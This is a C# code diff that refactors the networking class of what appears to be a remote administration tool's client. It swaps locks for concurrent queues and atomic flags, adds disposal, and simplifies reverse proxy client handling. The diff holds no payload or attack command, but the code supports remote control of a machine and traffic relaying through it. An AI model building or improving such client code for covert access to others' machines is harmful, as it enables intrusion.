@@ -13,11 +13,12 @@ using System.Security.Authentication;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
+using System.Collections.Concurrent;
 using Pulsar.Common.Messages.Administration.ReverseProxy;
 
 namespace Pulsar.Client.Networking
 {
-    public class Client : ISender
+    public class Client : ISender, IDisposable
     {
         /// <summary>
         /// Occurs as a result of an unrecoverable issue with the client.
@@ -127,27 +128,27 @@ namespace Pulsar.Client.Networking
         /// <summary>
         /// The buffer size for receiving data in bytes.
         /// </summary>
-        public int BUFFER_SIZE { get { return 1024 * 16; } } // 16KB
+        public int BUFFER_SIZE => 1024 * 16; // 16KB
 
         /// <summary>
         /// The keep-alive time in ms.
         /// </summary>
-        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s
+        public uint KEEP_ALIVE_TIME => 25000; // 25s
 
         /// <summary>
         /// The keep-alive interval in ms.
         /// </summary>
-        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s
+        public uint KEEP_ALIVE_INTERVAL => 25000; // 25s
 
         /// <summary>
         /// The header size in bytes.
         /// </summary>
-        public int HEADER_SIZE { get { return 4; } } // 4B
+        public int HEADER_SIZE => 4; // 4B
 
         /// <summary>
         /// The maximum size of a message in bytes.
         /// </summary>
-        public int MAX_MESSAGE_SIZE { get { return (1024 * 1024) * 5; } } // 5MB
+        public int MAX_MESSAGE_SIZE => (1024 * 1024) * 5; // 5MB
 
         /// <summary>
         /// Returns an array containing all of the proxy clients of this client.
@@ -181,7 +182,7 @@ namespace Pulsar.Client.Networking
         /// <summary>
         /// A list of all the connected proxy clients that this client holds.
         /// </summary>
-        private List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();
+        private readonly List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();
 
         /// <summary>
         /// Lock object for the list of proxy clients.
@@ -201,32 +202,22 @@ namespace Pulsar.Client.Networking
         /// <summary>
         /// The queue which holds messages to send.
         /// </summary>
-        private readonly Queue<IMessage> _sendBuffers = new Queue<IMessage>();
+        private readonly ConcurrentQueue<IMessage> _sendBuffers = new ConcurrentQueue<IMessage>();
 
         /// <summary>
         /// Determines if the client is currently sending messages.
         /// </summary>
-        private bool _sendingMessages;
-
-        /// <summary>
-        /// Lock object for the sending messages boolean.
-        /// </summary>
-        private readonly object _sendingMessagesLock = new object();
+        private int _sendingMessagesFlag;
 
         /// <summary>
         /// The queue which holds buffers to read.
         /// </summary>
-        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();
+        private readonly ConcurrentQueue<byte[]> _readBuffers = new ConcurrentQueue<byte[]>();
 
         /// <summary>
         /// Determines if the client is currently reading messages.
         /// </summary>
-        private bool _readingMessages;
-
-        /// <summary>
-        /// Lock object for the reading messages boolean.
-        /// </summary>
-        private readonly object _readingMessagesLock = new object();
+        private int _readingMessagesFlag;
 
         // Receive info
         private int _readOffset;
@@ -332,7 +323,7 @@ namespace Pulsar.Client.Networking
                 return;
             }
 
-            byte[] received = new byte[bytesTransferred];
+            var received = new byte[bytesTransferred];
 
             try
             {
@@ -344,18 +335,11 @@ namespace Pulsar.Client.Networking
                 return;
             }
 
-            lock (_readBuffers)
-            {
-                _readBuffers.Enqueue(received);
-            }
+            _readBuffers.Enqueue(received);
 
-            lock (_readingMessagesLock)
+            if (System.Threading.Interlocked.Exchange(ref _readingMessagesFlag, 1) == 0)
             {
-                if (!_readingMessages)
-                {
-                    _readingMessages = true;
-                    ThreadPool.QueueUserWorkItem(AsyncReceive);
-                }
+                ThreadPool.QueueUserWorkItem(AsyncReceive);
             }
 
             try
@@ -376,18 +360,10 @@ namespace Pulsar.Client.Networking
             while (true)
             {
                 byte[] readBuffer;
-                lock (_readBuffers)
+                if (!_readBuffers.TryDequeue(out readBuffer))
                 {
-                    if (_readBuffers.Count == 0)
-                    {
-                        lock (_readingMessagesLock)
-                        {
-                            _readingMessages = false;
-                        }
-                        return;
-                    }
-
-                    readBuffer = _readBuffers.Dequeue();
+                    System.Threading.Interlocked.Exchange(ref _readingMessagesFlag, 0);
+                    return;
                 }
 
                 _readableDataLen += readBuffer.Length;
@@ -517,31 +493,54 @@ namespace Pulsar.Client.Networking
         public void Send<T>(T message) where T : IMessage
         {
             if (!Connected || message == null) return;
+            _sendBuffers.Enqueue(message);
+            StartSendBufferProcessing();
+        }
 
-            lock (_sendBuffers)
+        private void StartSendBufferProcessing()
+        {
+            if (System.Threading.Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
             {
-                _sendBuffers.Enqueue(message);
+                ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
+            }
+        }
 
-                lock (_sendingMessagesLock)
+        private void ProcessSendBuffers(object state)
+        {
+            while (true)
+            {
+                if (!Connected)
                 {
-                    if (_sendingMessages) return;
-
-                    _sendingMessages = true;
-                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
+                    SendCleanup(true);
+                    return;
                 }
+                IMessage message;
+                if (!_sendBuffers.TryDequeue(out message))
+                {
+                    SendCleanup();
+                    return;
+                }
+                SafeSendMessage(message);
+            }
+        }
+
+        private void SendCleanup(bool clear = false)
+        {
+            System.Threading.Interlocked.Exchange(ref _sendingMessagesFlag, 0);
+            if (clear)
+            {
+                while (_sendBuffers.TryDequeue(out _)) { }
             }
         }
 
         /// <summary>
-        /// Sends a message to the connected server.
-        /// Blocks the thread until the message has been sent.
+        /// Sends a message to the connected server and blocks until sent.
         /// </summary>
         /// <typeparam name="T">The type of the message.</typeparam>
         /// <param name="message">The message to be sent.</param>
         public void SendBlocking<T>(T message) where T : IMessage
         {
             if (!Connected || message == null) return;
-
             SafeSendMessage(message);
         }
 
@@ -571,47 +570,6 @@ namespace Pulsar.Client.Networking
             }
         }
 
-        private void ProcessSendBuffers(object state)
-        {
-            while (true)
-            {
-                if (!Connected)
-                {
-                    SendCleanup(true);
-                    return;
-                }
-
-                IMessage message;
-                lock (_sendBuffers)
-                {
-                    if (_sendBuffers.Count == 0)
-                    {
-                        SendCleanup();
-                        return;
-                    }
-
-                    message = _sendBuffers.Dequeue();
-                }
-
-                SafeSendMessage(message);
-            }
-        }
-
-        private void SendCleanup(bool clear = false)
-        {
-            lock (_sendingMessagesLock)
-            {
-                _sendingMessages = false;
-            }
-
-            if (!clear) return;
-
-            lock (_sendBuffers)
-            {
-                _sendBuffers.Clear();
-            }
-        }
-
         /// <summary>
         /// Disconnect the client from the server, disconnect all proxies that
         /// are held by this client, and dispose of other resources associated
@@ -628,32 +586,34 @@ namespace Pulsar.Client.Networking
                 _payloadLen = 0;
                 _payloadBuffer = null;
                 _receiveState = ReceiveType.Header;
-                //_singleWriteMutex.Dispose(); TODO: fix socket re-use by creating new client on disconnect
-
                 if (_proxyClients != null)
                 {
                     lock (_proxyClientsLock)
                     {
-                        try
+                        foreach (var proxy in _proxyClients)
                         {
-                            foreach (ReverseProxyClient proxy in _proxyClients)
+                            try
+                            {
                                 proxy.Disconnect();
-                        }
-                        catch (Exception)
-                        {
+                            }
+                            catch (Exception ex)
+                            {
+                                // Log or handle proxy disconnect exceptions
+                                System.Diagnostics.Debug.WriteLine($"Proxy disconnect error: {ex.Message}");
+                            }
                         }
                     }
                 }
             }
-
             OnClientState(false);
         }
 
         public void ConnectReverseProxy(ReverseProxyConnect command)
         {
+            var proxy = new ReverseProxyClient(command, this);
             lock (_proxyClientsLock)
             {
-                _proxyClients.Add(new ReverseProxyClient(command, this));
+                _proxyClients.Add(proxy);
             }
         }
 
@@ -661,27 +621,36 @@ namespace Pulsar.Client.Networking
         {
             lock (_proxyClientsLock)
             {
-                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
+                return _proxyClients.FirstOrDefault(proxy => proxy.ConnectionId == connectionId);
             }
         }
 
         public void RemoveProxyClient(int connectionId)
         {
-            try
+            lock (_proxyClientsLock)
             {
-                lock (_proxyClientsLock)
-                {
-                    for (int i = 0; i < _proxyClients.Count; i++)
-                    {
-                        if (_proxyClients[i].ConnectionId == connectionId)
-                        {
-                            _proxyClients.RemoveAt(i);
-                            break;
-                        }
-                    }
-                }
+                _proxyClients.RemoveAll(proxy => proxy.ConnectionId == connectionId);
             }
-            catch { }
+        }
+
+        /// <summary>
+        /// Implement IDisposable for managed resources.
+        /// </summary>
+        protected virtual void Dispose(bool disposing)
+        {
+            if (disposing)
+            {
+                if (_singleWriteMutex != null) _singleWriteMutex.Dispose();
+                if (_stream != null) _stream.Dispose();
+                _readBuffer = null;
+                _payloadBuffer = null;
+            }
+        }
+
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
         }
     }
 }
